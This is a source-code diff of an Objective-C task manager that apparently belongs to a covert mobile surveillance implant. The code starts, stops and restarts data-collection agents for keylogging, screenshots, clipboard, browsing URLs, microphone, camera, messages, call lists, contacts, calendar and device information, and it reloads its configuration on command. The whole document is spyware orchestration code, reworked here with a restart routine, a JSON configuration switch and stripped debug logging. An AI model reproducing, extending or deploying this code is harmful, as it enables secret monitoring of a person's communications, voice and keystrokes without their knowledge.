@@ -28,11 +28,14 @@
 #import "RCSIConfManager.h"
 #import "RCSILogManager.h"
 #import "RCSIActions.h"
-#import "RCSIEvents.h"
 #import "RCSICommon.h"
 #import "RCSINotificationSupport.h"
+#import "RCSIEvents.h"
+#import "RCSIEventTimer.h"
 
-//#define DEBUG
+#define JSON_CONFIG
+#define DEBUG_
+
 //#define NO_START_AT_LAUNCH
 
 static NSLock *gTaskManagerLock             = nil;
@@ -248,59 +251,96 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   return FALSE;
 }
 
+// Restart component in case of failure:
+// the configuration is invalid, or some components don't stopped
+- (void)checkManagersAndRestart
+{
+  RCSIEvents *eventManager = [RCSIEvents sharedInstance];
+  RCSIActions *actionManager = [RCSIActions sharedInstance];
+  
+  // restart the action manager runloop
+  if ([actionManager stop] == TRUE)
+    [actionManager start];
+  
+  // restart events manager runloop
+  if ([eventManager stop] == TRUE)
+    [eventManager start];
+  
+  // restart agents
+  if ([self stopAgents] == TRUE)
+    [self startAgents];
+  
+  // restart event thread here
+  if ([self stopEvents] == TRUE)
+    [self startEvents];
+}
+
 - (BOOL)reloadConfiguration
 {
   if (mShouldReloadConfiguration == YES) 
     {
       mShouldReloadConfiguration = NO;
-    
-      //
-      // Now stop all the agents and reload configuration
-      //
+      
+      RCSIEvents  *eventManager  = [RCSIEvents sharedInstance];
+      RCSIActions *actionManager = [RCSIActions sharedInstance];
+      
+      // Now stop all tasks and reload configuration
       if ([self stopEvents] == TRUE)
-        {
+        { 
+          // no issues for timing it out
+          if ([eventManager stop] == FALSE)
+            {
 #ifdef DEBUG
-          NSLog(@"[reloadConfiguration] Events stopped correctly");
+              NSLog(@"%s: event manager stop timeout reached",__FUNCTION__);
 #endif
-          
+            }
+            
+          // no issues for timing it out  
+          if ([actionManager stop] == TRUE)
+            {
+#ifdef DEBUG
+            NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
+#endif      
+            }
+            
           if ([self stopAgents] == TRUE)
             {
 #ifdef DEBUG
-              NSLog(@"[reloadConfiguration] Agents stopped correctly");
-#endif
-              
-              //
-              // Now reload configuration
-              //
-              if ([mConfigManager loadConfiguration] == YES)
-                {
-                  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-                  [infoManager logActionWithDescription: @"New configuration activated"];
-                  [infoManager release];
-
-                  //
-                  // Start agents
-                  //
-                  [self startAgents];
-                  
-                  //
-                  // Start event thread here
-                  //
-                  [self eventsMonitor];
-                }
-              else
-                {
-                  // previous one
-#ifdef DEBUG
-                  NSLog(@"[reloadConfiguration] An error occurred while reloading the configuration file");
-#endif
-                  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-                  [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
-                  [infoManager release];
-
-                  return NO;
-                }
+              NSLog(@"%s: agents stop timeout reached",__FUNCTION__);
+#endif      
             }
+            
+          // Now reload configuration
+          if ([mConfigManager loadConfiguration] == YES)
+            {
+              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+              [infoManager logActionWithDescription: @"New configuration activated"];
+              [infoManager release];
+              
+              // start the action manager runloop
+              [actionManager start];
+            
+              // Start event thread here
+              [self startEvents];
+              
+              // start events manager runloop
+              [eventManager start];
+              
+              // Start agents
+              [self startAgents];
+            }
+          else
+            {
+              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+              [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
+              [infoManager release];
+
+              return NO;
+            }
+        }
+      else
+        {
+          return FALSE;
         }
     }
   
@@ -441,26 +481,19 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark Agents
 #pragma mark -
 
-- (id)initAgent: (u_int)agentID
-{
-  return nil;
-}
 
 - (BOOL)startAgent: (u_int)agentID
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
   NSMutableDictionary *agentConfiguration;
   NSData *agentCommand;
   
   switch (agentID)
     {
+    // External agents
     case AGENT_SCREENSHOT:
       {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent Screenshot", __FUNCTION__);
-#endif
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
       
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -480,16 +513,18 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             memcpy(shMemoryHeader->commandData, 
                    [agentConf bytes], 
                    [agentConf length]);
-#ifdef DEBUG
-            NSLog(@"%s: Starting remote Screenshot Agent", __FUNCTION__);
-#endif
-            
+           
             if ([mSharedMemory writeMemory: agentCommand
                                     offset: OFFT_SCREENSHOT
                              fromComponent: COMP_CORE])
               {
+#ifdef JSON_CONFIG
+                [agentConfiguration setObject: AGENT_STOPPED
+                                       forKey: @"status"];
+#else
                 [agentConfiguration setObject: AGENT_RUNNING
                                        forKey: @"status"];
+#endif                                      
               }
           
             [agentConfiguration release];
@@ -498,44 +533,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       
         break;
       }        
-    case AGENT_MICROPHONE:
-      {   
-#ifdef DEBUG
-        NSLog(@"Starting Agent Microphone");
-#endif
-        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
+    case AGENT_URL:
+      {
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
             [agentConfiguration objectForKey: @"status"] != AGENT_START &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
-          {
-            [agentConfiguration setObject: AGENT_START forKey: @"status"];
-            
-            agentMicrophone.mAgentConfiguration = agentConfiguration;
-            
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentMicrophone
-                                   withObject: nil];
-          }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Microphone is already running");
-#endif
-          }
-        break;
-      }
-    case AGENT_URL:
-      {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent URL", __FUNCTION__);
-#endif
-      
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
-            && [agentConfiguration objectForKey: @"status"] != AGENT_START &&
             [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
           {
             agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -546,24 +549,13 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             shMemoryHeader->command         = AG_START;
             shMemoryHeader->commandDataSize = 0;
             
-            BOOL success = [_logManager createLog: LOG_URL
-                                      agentHeader: nil
-                                        withLogID: 0];
-            
-            if (success == TRUE)
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_URL
+                             fromComponent: COMP_CORE])
               {
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_URL
-                                 fromComponent: COMP_CORE])
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: Command START sent to Agent URL", __FUNCTION__);
-#endif
-                    [agentConfiguration setObject: AGENT_RUNNING
-                                           forKey: @"status"];
-                  }
+                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
               }
-        
+
             [agentConfiguration release];
             [agentCommand release];
           }
@@ -575,12 +567,8 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             }
         break;
       }
-    case AGENT_APPLICATION:
+    case AGENT_KEYLOG:
       {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent Application", __FUNCTION__);
-#endif
-      
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
@@ -595,43 +583,104 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             shMemoryHeader->command         = AG_START;
             shMemoryHeader->commandDataSize = 0;
             
-            BOOL success = [_logManager createLog: LOG_APPLICATION
-                                      agentHeader: nil
-                                        withLogID: 0];
-            
-            if (success == TRUE)
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_KEYLOG
+                             fromComponent: COMP_CORE])
               {
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_APPLICATION
-                                 fromComponent: COMP_CORE])
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: Command START sent to Agent Application", __FUNCTION__);
-#endif
-                    [agentConfiguration setObject: AGENT_RUNNING
-                                           forKey: @"status"];
-                  }
+                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
               }
-        
+            
             [agentConfiguration release];
             [agentCommand release];
           }
-        else
+        break;
+      } 
+    case AGENT_CLIPBOARD:
+      {
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
+            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
           {
-#ifdef DEBUG
-            NSLog(@"%s: Agent URL is already running", __FUNCTION__);
-#endif
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+            
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_CLIPBOARD
+                             fromComponent: COMP_CORE])
+              {
+                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+              }
+            
+            [agentConfiguration release];
+            [agentCommand release];
+          }
+        
+        break;
+      }
+    // Internal agents (threaded)
+    case AGENT_APPLICATION:
+      {
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
+            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
+          {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+            
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_APPLICATION
+                             fromComponent: COMP_CORE])
+              {
+                [agentConfiguration setObject: AGENT_RUNNING  forKey: @"status"];
+              }
+                          
+            [agentConfiguration release];
+            [agentCommand release];
           }
       
         break;
       }
+    case AGENT_MICROPHONE:
+      {   
+        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
+        
+        //XXX-
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
+          {
+            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+          
+            agentMicrophone.mAgentConfiguration = agentConfiguration;
+          
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentMicrophone
+                                   withObject: nil];
+          }
+        
+        break;
+      }
     case AGENT_MESSAGES:
       {   
-#ifdef DEBUG
-        NSLog(@"Starting Agent Messages");
-#endif
         RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
         
+        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -646,22 +695,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                      toTarget: agentMessages
                                    withObject: nil];
           }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Messages is already running");
-#endif
-          }
+        
         break;
       }
     case AGENT_ORGANIZER:
       {   
-#ifdef DEBUG
-        NSLog(@"Starting Agent AddressBook and Calendar");
-#endif
-        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
-        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
-                                            
+        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];                               
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -669,12 +708,15 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
-#ifdef DEBUG
-            NSLog(@"Starting Agent AddressBook and Calendar: starting new thread");
-#endif 
+#ifdef  JSON_CONFIG
+            agentCalendar.mAgentConfiguration = agentConfiguration;
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentCalendar
+                                   withObject: nil];
+#else      
+            RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
             agentAddress.mAgentConfiguration  = agentConfiguration;
             agentCalendar.mAgentConfiguration = agentConfiguration;
-            
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentAddress
                                    withObject: nil];
@@ -682,69 +724,31 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentCalendar
                                    withObject: nil];
-          }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent AddressBook is already running");
 #endif
           }
+
         break;
       }
-    case AGENT_KEYLOG:
-      {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent Keylog", __FUNCTION__);
-#endif
-        
+    case AGENT_ADDRESSBOOK:
+      {   
+        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];                             
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
             [agentConfiguration objectForKey: @"status"] != AGENT_START &&
             [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
           {
-            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-            
-            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-            shMemoryHeader->agentID         = agentID;
-            shMemoryHeader->direction       = D_TO_AGENT;
-            shMemoryHeader->command         = AG_START;
-            shMemoryHeader->commandDataSize = 0;
-            
-            BOOL success = [_logManager createLog: LOG_KEYLOG
-                                      agentHeader: nil
-                                        withLogID: 0];
-            
-            if (success == TRUE)
-              {
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_KEYLOG
-                                 fromComponent: COMP_CORE])
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: Command START sent to Agent Keylog", __FUNCTION__);
-#endif
-                    [agentConfiguration setObject: AGENT_RUNNING
-                                           forKey: @"status"];
-                  }
-              }
+            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentAddress
+                                   withObject: nil];
+          }
         
-            [agentConfiguration release];
-            [agentCommand release];
-          }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"%s: Agent Keylog is already running", __FUNCTION__);
-#endif
-          }
         break;
-      } 
+      }
     case AGENT_CRISIS:
       {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
-#endif
         gAgentCrisis = YES;
 
         RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
@@ -755,10 +759,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       } 
     case AGENT_DEVICE:
       {
-#ifdef DEBUG
-        NSLog(@"Starting Agent Device");
-#endif
         RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
+        
+        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -773,20 +776,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                      toTarget: agentDevice
                                    withObject: nil];
           }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Device is already running");
-#endif
-          }
+
         break;
       }
     case AGENT_CALL_LIST:
       {   
-#ifdef DEBUG
-        NSLog(@"Starting Agent Call List");
-#endif
         RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
+      
+        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -802,70 +799,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                      toTarget: agentCallList
                                    withObject: nil];
           }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Messages is already running");
-#endif
-          }
-        break;
-      }
-    case AGENT_CLIPBOARD:
-      {
-#ifdef DEBUG
-        NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
-#endif
 
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
-            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
-          {
-            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-
-            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-            shMemoryHeader->agentID         = agentID;
-            shMemoryHeader->direction       = D_TO_AGENT;
-            shMemoryHeader->command         = AG_START;
-            shMemoryHeader->commandDataSize = 0;
-
-            BOOL success = [_logManager createLog: LOG_CLIPBOARD
-                                      agentHeader: nil
-                                        withLogID: 0];
-
-            if (success == TRUE)
-              {
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_CLIPBOARD
-                                 fromComponent: COMP_CORE])
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
-#endif
-                    [agentConfiguration setObject: AGENT_RUNNING
-                      forKey: @"status"];
-                  }
-              }
-
-            [agentConfiguration release];
-            [agentCommand release];
-          }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"%s: Agent clipboard is already running", __FUNCTION__);
-#endif
-          }
         break;
       }
     case AGENT_CAM:
       {
-#ifdef DEBUG
-        NSLog(@"Starting Agent Camera");
-#endif
         RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
         
+        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
       
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -880,12 +821,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                      toTarget: agentCamera
                                    withObject: nil];
           }
-        else
-          {
-#ifdef DEBUG
-            NSLog(@"Agent Camera is already running");
-#endif
-          }
         break;
       }
     default:
@@ -894,19 +829,8 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       }
     }
 
-  //[agentConfiguration release];
   [outerPool release];
   
-  return YES;
-}
-
-- (BOOL)restartAgent: (u_int)agentID
-{
-  return YES;
-}
-
-- (BOOL)suspendAgent: (u_int)agentID
-{
   return YES;
 }
 
@@ -1015,7 +939,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
 - (BOOL)stopAgent: (u_int)agentID
 {
-  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
   NSMutableDictionary *agentConfiguration;
   NSData *agentCommand;
 
@@ -1025,11 +948,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   
   switch (agentID)
     {
+    // External agents
     case AGENT_SCREENSHOT:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent Screenshot");
-#endif
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         
         shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -1040,75 +961,17 @@ extern RCSISharedMemory *mSharedMemoryCommand;
         if ([mSharedMemory writeMemory: agentCommand
                                 offset: OFFT_SCREENSHOT
                          fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
-#endif
-            
+          {     
             agentConfiguration = [self getConfigForAgent: agentID];
             [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
           }
       
-        [agentCommand release];
-      
-        break;
-      }
-    case AGENT_MICROPHONE:
-      {
-#ifdef DEBUG
-        NSLog(@"Stopping Agent Microphone");
-#endif
-        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
-        
-        if ([agentMicrophone stop] == FALSE)
-          {
-#ifdef DEBUG
-            NSLog(@"Error while stopping agent Microphone");
-#endif
-          }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          }
-        
-        break;
-      }
-    case AGENT_URL:
-      {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent URL");
-#endif
-        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([mSharedMemory writeMemory: agentCommand
-                                offset: OFFT_URL
-                         fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent URL");
-#endif
-            
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          
-            [_logManager closeActiveLog: LOG_URL withLogID: 0];
-          }
-        
         [agentCommand release];
       
         break;
       }
     case AGENT_APPLICATION:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent Application");
-#endif
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         
         shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -1120,25 +983,37 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                 offset: OFFT_APPLICATION
                          fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent Application");
-#endif
-        
             agentConfiguration = [self getConfigForAgent: agentID];
             [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          
-            [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
           }
-      
+        
         [agentCommand release];
-      
+        
+        break;
+      }
+    case AGENT_URL:
+      {
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        
+        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+        shMemoryHeader->agentID         = agentID;
+        shMemoryHeader->direction       = D_TO_AGENT;
+        shMemoryHeader->command         = AG_STOP;
+        
+        if ([mSharedMemory writeMemory: agentCommand
+                                offset: OFFT_URL
+                         fromComponent: COMP_CORE] == TRUE)
+          {
+            agentConfiguration = [self getConfigForAgent: agentID];
+            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          }
+        
+        [agentCommand release];
+        
         break;
       }
     case AGENT_MESSAGES:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent Messages");
-#endif
         RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
         
         if ([agentMessages stop] == FALSE)
@@ -1147,49 +1022,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             NSLog(@"Error while stopping agent Messages");
 #endif
           }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          }
-        
-#ifdef DEBUG
-        NSLog(@"AgentStatus: %@", [[self getConfigForAgent: AGENT_MESSAGES] objectForKey: @"status"]);
-#endif
-        
-        break;
-      }
-    case AGENT_ORGANIZER:
-      {
-#ifdef DEBUG
-        NSLog(@"Stopping Agent AddressBook");
-#endif
-        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
-        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
-        
-        if ([agentAddress stop]  == FALSE ||
-            [agentCalendar stop] == FALSE)
-          {
-#ifdef DEBUG
-            NSLog(@"Error while stopping agent AddressBook/Calendar");
-#endif
-          }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          }
-        
-#ifdef DEBUG      
-        NSLog(@"AgentStatus: %@", [[self getConfigForAgent: AGENT_ORGANIZER] objectForKey: @"status"]);
-#endif
+           
         break;
       }
     case AGENT_KEYLOG:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent Keylog");
-#endif
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         
         shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -1201,25 +1038,88 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                 offset: OFFT_KEYLOG
                          fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent Keylog");
-#endif
-            
             agentConfiguration = [self getConfigForAgent: agentID];
             [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          
-            [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
+          }
+        
+        [agentCommand release];
+        
+        break;
+      }
+    case AGENT_CLIPBOARD:
+      {
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        
+        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+        shMemoryHeader->agentID         = agentID;
+        shMemoryHeader->direction       = D_TO_AGENT;
+        shMemoryHeader->command         = AG_STOP;
+        
+        if ([mSharedMemory writeMemory: agentCommand
+                                offset: OFFT_CLIPBOARD
+                         fromComponent: COMP_CORE] == TRUE)
+          {
+            agentConfiguration = [self getConfigForAgent: agentID];
+            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          }
+        
+        [agentCommand release];
+        
+        break;
+      }
+    // Internal agents (threaded)
+    case AGENT_MICROPHONE:
+      {
+        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
+        
+        if ([agentMicrophone stop] == FALSE)
+          {
+#ifdef DEBUG
+            NSLog(@"Error while stopping agent Microphone");
+#endif
           }
       
-        [agentCommand release];
+        break;
+      }
+    case AGENT_ORGANIZER:
+      {
+#ifdef JSON_CONFIG
+      RCSIAgentCalendar *agentCalendar = [RCSIAgentCalendar sharedInstance];
       
+      if ([agentCalendar stop] == FALSE)
+        {
+#ifdef DEBUG
+          NSLog(@"Error while stopping agent AddressBook/Calendar");
+#endif
+        }
+#else
+        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
+        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
+        
+        if ([agentAddress stop]  == FALSE ||
+            [agentCalendar stop] == FALSE)
+          {
+#ifdef DEBUG
+            NSLog(@"Error while stopping agent AddressBook/Calendar");
+#endif
+          }
+#endif    
+        break;
+      }
+    case AGENT_ADDRESSBOOK:
+      {
+        RCSIAgentAddressBook *agentAB = [RCSIAgentAddressBook sharedInstance];
+      
+        if ([agentAB stop] == FALSE)
+          {
+#ifdef DEBUG
+            NSLog(@"Error while stopping agent AddressBook/Calendar");
+#endif
+          }  
         break;
       }
     case AGENT_CRISIS:
       {
-#ifdef DEBUG
-        NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
-#endif
         gAgentCrisis = NO;
 
         RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
@@ -1230,9 +1130,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       } 
     case LOGTYPE_DEVICE:
       {
-#ifdef DEBUG
-        NSLog(@"Stopping Agent Device");
-#endif
         RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
 
         if ([agentDevice stop] == FALSE)
@@ -1240,11 +1137,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
             NSLog(@"Error while stopping agent Device");
 #endif
-          }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
           }
 
         break;
@@ -1262,50 +1154,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             NSLog(@"Error while stopping agent Call List");
 #endif
           }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED
-                                   forKey: @"status"];
-          }
-        break;
-      }
-    case AGENT_CLIPBOARD:
-      {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent clipboard");
-#endif
-        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-
-        if ([mSharedMemory writeMemory: agentCommand
-            offset: OFFT_CLIPBOARD
-            fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent clipboard");
-#endif
-
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-
-            [_logManager closeActiveLog: LOG_CLIPBOARD 
-              withLogID: 0];
-          }
-
-        [agentCommand release];
-
+          
         break;
       }
